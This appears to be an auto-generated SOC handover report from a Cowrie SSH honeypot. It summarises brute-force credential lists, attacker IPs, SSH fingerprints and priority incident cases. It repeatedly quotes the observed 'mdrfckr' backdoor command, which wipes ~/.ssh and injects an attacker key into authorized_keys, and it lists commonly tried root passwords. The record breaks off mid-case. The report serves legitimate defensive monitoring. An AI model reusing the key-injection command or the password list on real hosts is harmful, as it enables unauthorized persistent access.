# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-20 |
| **Generated At** | 2026-04-20T20:54:04Z |
| **Shift Time** | 20:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **286** |
| Confirmed Threats | **282** |
| False Positives Filtered | **4** (1.4%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **10** |
| High Severity Cases | **148** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **138** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **275** |
| Unique Credential Pairs | **53** |
| Unique Usernames | **17** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **80** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 148 |
| `345gs5662d34` | 74 |
| `ubuntu` | 13 |
| `test` | 7 |
| `odoo` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 74 |
| `3245gs5662d34` | 74 |
| `Odoo01` | 3 |
| `qazwsx111111@#` | 3 |
| `Jenkins@123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 74 |
| `root` | `3245gs5662d34` | 74 |
| `odoo` | `Odoo01` | 3 |
| `root` | `qazwsx111111@#` | 3 |
| `jenkins` | `Jenkins@123` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx111111@#` | `103.113.105.228` | 2026-04-20T19:50:17 |
| `root` | `3245gs5662d34` | `103.113.105.228` | 2026-04-20T19:50:19 |
| `root` | `12qwert` | `13.81.183.28` | 2026-04-20T19:51:08 |
| `root` | `3245gs5662d34` | `13.81.183.28` | 2026-04-20T19:51:12 |
| `root` | `!@#asd123` | `13.81.183.28` | 2026-04-20T19:51:48 |
| `root` | `110110` | `13.81.183.28` | 2026-04-20T19:53:02 |
| `root` | `root123123@#` | `13.81.183.28` | 2026-04-20T19:53:43 |
| `root` | `Ls123456` | `46.253.45.10` | 2026-04-20T19:53:44 |
| `root` | `3245gs5662d34` | `46.253.45.10` | 2026-04-20T19:53:48 |
| `root` | `Ls123456` | `13.81.183.28` | 2026-04-20T19:55:04 |
| `root` | `root.123456` | `46.253.45.10` | 2026-04-20T19:55:16 |
| `root` | `Password@1234!` | `209.141.47.217` | 2026-04-20T19:55:27 |
| `root` | `3245gs5662d34` | `209.141.47.217` | 2026-04-20T19:55:33 |
| `root` | `mike` | `13.81.183.28` | 2026-04-20T19:55:51 |
| `root` | `Qwe12345.` | `186.219.184.142` | 2026-04-20T19:56:05 |
| `root` | `3245gs5662d34` | `186.219.184.142` | 2026-04-20T19:56:13 |
| `root` | `Adm1n123` | `13.81.183.28` | 2026-04-20T19:56:34 |
| `root` | `qazwsx12345!@` | `154.221.28.214` | 2026-04-20T19:56:43 |
| `root` | `3245gs5662d34` | `154.221.28.214` | 2026-04-20T19:56:52 |
| `root` | `Password@1234!` | `186.219.184.142` | 2026-04-20T19:57:55 |
| `root` | `root.123456` | `13.81.183.28` | 2026-04-20T19:58:00 |
| `root` | `root1111111!@` | `46.253.45.10` | 2026-04-20T19:58:12 |
| `root` | `qazwsx123321!@` | `154.221.28.214` | 2026-04-20T19:58:26 |
| `root` | `Qwe123.` | `13.81.183.28` | 2026-04-20T19:58:42 |
| `root` | `Abcd123#` | `13.81.183.28` | 2026-04-20T19:59:26 |
| `root` | `qwer123@` | `46.253.45.10` | 2026-04-20T19:59:36 |
| `root` | `Yh@123456` | `209.141.47.217` | 2026-04-20T20:00:01 |
| `root` | `qwer123@` | `13.81.183.28` | 2026-04-20T20:00:08 |
| `root` | `qazwsx123456..` | `154.221.28.214` | 2026-04-20T20:00:09 |
| `root` | `zzAA000` | `186.219.184.142` | 2026-04-20T20:01:23 |
| `root` | `root1111111!@` | `13.81.183.28` | 2026-04-20T20:01:30 |
| `root` | `root2023#$` | `209.141.47.217` | 2026-04-20T20:01:47 |
| `root` | `Password@1234!` | `154.221.28.214` | 2026-04-20T20:01:51 |
| `root` | `qazwsx111111@#` | `13.81.183.28` | 2026-04-20T20:02:17 |
| `root` | `12qwert` | `46.253.45.10` | 2026-04-20T20:02:29 |
| `root` | `root2023#$` | `186.219.184.142` | 2026-04-20T20:03:11 |
| `root` | `6yhn!@` | `154.221.28.214` | 2026-04-20T20:03:32 |
| `root` | `qazwsx12345!@` | `209.141.47.217` | 2026-04-20T20:03:41 |
| `root` | `Adm1n123` | `46.253.45.10` | 2026-04-20T20:03:55 |
| `root` | `a1234567891011` | `13.81.183.28` | 2026-04-20T20:04:17 |
| `root` | `1qaz@WSX.` | `186.219.184.142` | 2026-04-20T20:04:58 |
| `root` | `Zx123123` | `13.81.183.28` | 2026-04-20T20:05:00 |
| `root` | `zzAA000` | `154.221.28.214` | 2026-04-20T20:05:15 |
| `root` | `qazwsx000!` | `13.81.183.28` | 2026-04-20T20:06:22 |
| `root` | `qazwsx123456..` | `209.141.47.217` | 2026-04-20T20:06:42 |
| `root` | `Zx123123` | `46.253.45.10` | 2026-04-20T20:06:56 |
| `root` | `55` | `13.81.183.28` | 2026-04-20T20:07:16 |
| `root` | `root1234.` | `209.141.47.217` | 2026-04-20T20:08:28 |
| `root` | `qazwsx111111@#` | `46.253.45.10` | 2026-04-20T20:08:34 |
| `root` | `1qaz@WSX.` | `154.221.28.214` | 2026-04-20T20:08:49 |
| `root` | `mike` | `46.253.45.10` | 2026-04-20T20:11:37 |
| `root` | `Root2025!@` | `186.219.184.142` | 2026-04-20T20:12:22 |
| `root` | `qazwsx000!` | `46.253.45.10` | 2026-04-20T20:13:04 |
| `root` | `zzAA000` | `209.141.47.217` | 2026-04-20T20:13:26 |
| `root` | `qazwsx123321!@` | `186.219.184.142` | 2026-04-20T20:14:12 |
| `root` | `a1234567891011` | `46.253.45.10` | 2026-04-20T20:14:32 |
| `root` | `1qaz@WSX.` | `209.141.47.217` | 2026-04-20T20:15:09 |
| `root` | `root1234.` | `154.221.28.214` | 2026-04-20T20:15:53 |
| `root` | `55` | `46.253.45.10` | 2026-04-20T20:15:59 |
| `root` | `6yhn!@` | `186.219.184.142` | 2026-04-20T20:16:02 |
| `root` | `qazwsx123321!@` | `209.141.47.217` | 2026-04-20T20:16:48 |
| `root` | `!@#asd123` | `46.253.45.10` | 2026-04-20T20:17:23 |
| `root` | `qazwsx12345!@` | `186.219.184.142` | 2026-04-20T20:17:49 |
| `root` | `Qwe12345.` | `209.141.47.217` | 2026-04-20T20:18:26 |
| `root` | `110110` | `46.253.45.10` | 2026-04-20T20:18:47 |
| `root` | `qazwsx123456..` | `186.219.184.142` | 2026-04-20T20:19:32 |
| `root` | `Yh@123456` | `186.219.184.142` | 2026-04-20T20:21:21 |
| `root` | `Abcd123#` | `46.253.45.10` | 2026-04-20T20:21:46 |
| `root` | `Root2025!@` | `154.221.28.214` | 2026-04-20T20:22:43 |
| `root` | `Qwerty!@` | `209.141.47.217` | 2026-04-20T20:22:59 |
| `root` | `root123123@#` | `46.253.45.10` | 2026-04-20T20:24:44 |
| `root` | `6yhn!@` | `209.141.47.217` | 2026-04-20T20:24:46 |
| `root` | `root1234.` | `186.219.184.142` | 2026-04-20T20:24:58 |
| `root` | `Qwe123.` | `46.253.45.10` | 2026-04-20T20:27:42 |
| `root` | `Qwerty!@` | `154.221.28.214` | 2026-04-20T20:27:56 |
| `root` | `Root2025!@` | `209.141.47.217` | 2026-04-20T20:29:28 |
| `root` | `Qwe12345.` | `154.221.28.214` | 2026-04-20T20:29:38 |
| `root` | `root2023#$` | `154.221.28.214` | 2026-04-20T20:31:19 |
| `root` | `Yh@123456` | `154.221.28.214` | 2026-04-20T20:33:00 |
| `root` | `Qwerty!@` | `186.219.184.142` | 2026-04-20T20:35:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **286** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 277 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 277 | 9 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 277 | 9 | Modern SSH client |
| `95420f9d932d...` | Go SSH scanner | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 74 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `13.81.183.28`, `154.221.28.214`, `46.253.45.10`, `103.113.105.228`, `209.141.47.217`, `186.219.184.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **16** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS142403` | YISU CLOUD LTD | 1 | HIGH |
| `AS17816` | China Unicom IP network China169 Guangdong province | 1 | HIGH |
| `AS53667` | FranTech Solutions | 1 | HIGH |
| `AS52312` | TV MUSIC HOUSE JUJUY | 1 | MEDIUM |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (148)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b05617f65405

| Field | Detail |
|---|---|
| **Source IP** | `103.113.105[.]228` |
| **First Seen** | 2026-04-20 19:50 |
| **Last Seen** | 2026-04-20 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:50:17` | `cowrie.session.connect` |
| `2026-04-20 19:50:17` | `cowrie.client.version` |
| `2026-04-20 19:50:17` | `cowrie.client.kex` |
| `2026-04-20 19:50:17` | `cowrie.login.success` |
| `2026-04-20 19:50:17` | `cowrie.session.params` |
| `2026-04-20 19:50:17` | `cowrie.command.input` |
| `2026-04-20 19:50:17` | `cowrie.command.failed` |
| `2026-04-20 19:50:17` | `cowrie.log.closed` |
| `2026-04-20 19:50:17` | `cowrie.session.params` |
| `2026-04-20 19:50:17` | `cowrie.command.input` |
| `2026-04-20 19:50:17` | `cowrie.session.file_download` |
| `2026-04-20 19:50:17` | `cowrie.log.closed` |
| `2026-04-20 19:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.113.105[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.113.105[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e3ed54423e1

| Field | Detail |
|---|---|
| **Source IP** | `103.113.105[.]228` |
| **First Seen** | 2026-04-20 19:50 |
| **Last Seen** | 2026-04-20 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:50:18` | `cowrie.session.connect` |
| `2026-04-20 19:50:18` | `cowrie.client.version` |
| `2026-04-20 19:50:18` | `cowrie.client.kex` |
| `2026-04-20 19:50:19` | `cowrie.login.success` |
| `2026-04-20 19:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.113.105[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.113.105[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e44c8d34c14

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:51 |
| **Last Seen** | 2026-04-20 19:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:51:08` | `cowrie.session.connect` |
| `2026-04-20 19:51:08` | `cowrie.client.version` |
| `2026-04-20 19:51:08` | `cowrie.client.kex` |
| `2026-04-20 19:51:08` | `cowrie.login.success` |
| `2026-04-20 19:51:09` | `cowrie.session.params` |
| `2026-04-20 19:51:09` | `cowrie.command.input` |
| `2026-04-20 19:51:09` | `cowrie.command.failed` |
| `2026-04-20 19:51:09` | `cowrie.log.closed` |
| `2026-04-20 19:51:09` | `cowrie.session.params` |
| `2026-04-20 19:51:09` | `cowrie.command.input` |
| `2026-04-20 19:51:09` | `cowrie.session.file_download` |
| `2026-04-20 19:51:09` | `cowrie.log.closed` |
| `2026-04-20 19:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ba69683a3e

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:51 |
| **Last Seen** | 2026-04-20 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:51:11` | `cowrie.session.connect` |
| `2026-04-20 19:51:11` | `cowrie.client.version` |
| `2026-04-20 19:51:11` | `cowrie.client.kex` |
| `2026-04-20 19:51:12` | `cowrie.login.success` |
| `2026-04-20 19:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f8b689f214

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:51 |
| **Last Seen** | 2026-04-20 19:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:51:48` | `cowrie.session.connect` |
| `2026-04-20 19:51:48` | `cowrie.client.version` |
| `2026-04-20 19:51:48` | `cowrie.client.kex` |
| `2026-04-20 19:51:48` | `cowrie.login.success` |
| `2026-04-20 19:51:49` | `cowrie.session.params` |
| `2026-04-20 19:51:49` | `cowrie.command.input` |
| `2026-04-20 19:51:49` | `cowrie.command.failed` |
| `2026-04-20 19:51:49` | `cowrie.log.closed` |
| `2026-04-20 19:51:49` | `cowrie.session.params` |
| `2026-04-20 19:51:49` | `cowrie.command.input` |
| `2026-04-20 19:51:49` | `cowrie.session.file_download` |
| `2026-04-20 19:51:49` | `cowrie.log.closed` |
| `2026-04-20 19:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8475353c1df8

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:51 |
| **Last Seen** | 2026-04-20 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:51:51` | `cowrie.session.connect` |
| `2026-04-20 19:51:51` | `cowrie.client.version` |
| `2026-04-20 19:51:52` | `cowrie.client.kex` |
| `2026-04-20 19:51:52` | `cowrie.login.success` |
| `2026-04-20 19:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abafdf91d8a4

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:53 |
| **Last Seen** | 2026-04-20 19:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:53:01` | `cowrie.session.connect` |
| `2026-04-20 19:53:01` | `cowrie.client.version` |
| `2026-04-20 19:53:01` | `cowrie.client.kex` |
| `2026-04-20 19:53:02` | `cowrie.login.success` |
| `2026-04-20 19:53:02` | `cowrie.session.params` |
| `2026-04-20 19:53:02` | `cowrie.command.input` |
| `2026-04-20 19:53:02` | `cowrie.command.failed` |
| `2026-04-20 19:53:02` | `cowrie.log.closed` |
| `2026-04-20 19:53:03` | `cowrie.session.params` |
| `2026-04-20 19:53:03` | `cowrie.command.input` |
| `2026-04-20 19:53:03` | `cowrie.session.file_download` |
| `2026-04-20 19:53:03` | `cowrie.log.closed` |
| `2026-04-20 19:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a390ad43d75

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:53 |
| **Last Seen** | 2026-04-20 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:53:05` | `cowrie.session.connect` |
| `2026-04-20 19:53:05` | `cowrie.client.version` |
| `2026-04-20 19:53:05` | `cowrie.client.kex` |
| `2026-04-20 19:53:06` | `cowrie.login.success` |
| `2026-04-20 19:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553db11b3e34

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:53 |
| **Last Seen** | 2026-04-20 19:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:53:42` | `cowrie.session.connect` |
| `2026-04-20 19:53:42` | `cowrie.client.version` |
| `2026-04-20 19:53:43` | `cowrie.client.kex` |
| `2026-04-20 19:53:43` | `cowrie.login.success` |
| `2026-04-20 19:53:43` | `cowrie.session.params` |
| `2026-04-20 19:53:43` | `cowrie.command.input` |
| `2026-04-20 19:53:43` | `cowrie.command.failed` |
| `2026-04-20 19:53:44` | `cowrie.log.closed` |
| `2026-04-20 19:53:44` | `cowrie.session.params` |
| `2026-04-20 19:53:44` | `cowrie.command.input` |
| `2026-04-20 19:53:44` | `cowrie.session.file_download` |
| `2026-04-20 19:53:44` | `cowrie.log.closed` |
| `2026-04-20 19:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1650674cee8d

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:53 |
| **Last Seen** | 2026-04-20 19:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:53:44` | `cowrie.session.connect` |
| `2026-04-20 19:53:44` | `cowrie.client.version` |
| `2026-04-20 19:53:44` | `cowrie.client.kex` |
| `2026-04-20 19:53:44` | `cowrie.login.success` |
